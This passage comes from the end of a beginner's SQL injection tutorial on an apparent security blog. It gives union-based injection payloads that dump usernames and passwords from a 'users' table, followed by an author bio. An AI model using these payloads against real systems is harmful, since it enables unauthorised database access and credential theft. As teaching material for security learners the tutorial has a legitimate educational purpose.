<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://2.bp.blogspot.com/-aryimcHaIfM/WVpw2r6o53I/AAAAAAAAQXk/wtXDWXB-J7Unpu13awFwJ1tQNFxt07VSACEwYBhgL/s1600/6.png" alt="SQL injection for beginners" width="876" height="225"/></span></p>
<p><span style="color: #000000;">The above statement will show us all the usernames from the table users. Now let’s check the passwords for these usernames. Type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,group_concat(password),3 from users --+</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XKuPpzpKHN8/WVpw3L0eQ4I/AAAAAAAAQXs/Kl_sZxo0xH8eGPA0-6-hRwMQa5mY4rmVgCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">And like this, you will have passwords to your usernames. There is another method to see usernames and passwords together with the following statement :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id=-1' union select 1,group_concat(username),group_concat(password) from users --+</pre>
<p><img loading="lazy" decoding="async" class="alignnone" src="https://4.bp.blogspot.com/-88t497bDVjU/WVpw3Pm9o2I/AAAAAAAAQXw/O5GpCVvhoPcGZ1s3gqkB21gWcO4c_M1iACEwYBhgL/s1600/8.png" alt="SQL injection for beginners" width="839" height="239"/></p>
<p><span style="color: #000000;">To learn more about Database Hacking. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/database-hacking/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author</strong> – Rinkish Khera is a Web Application security consultant who loves competitive coding, hacking and learning new things about technology. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/rinkish-khera-17012496"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
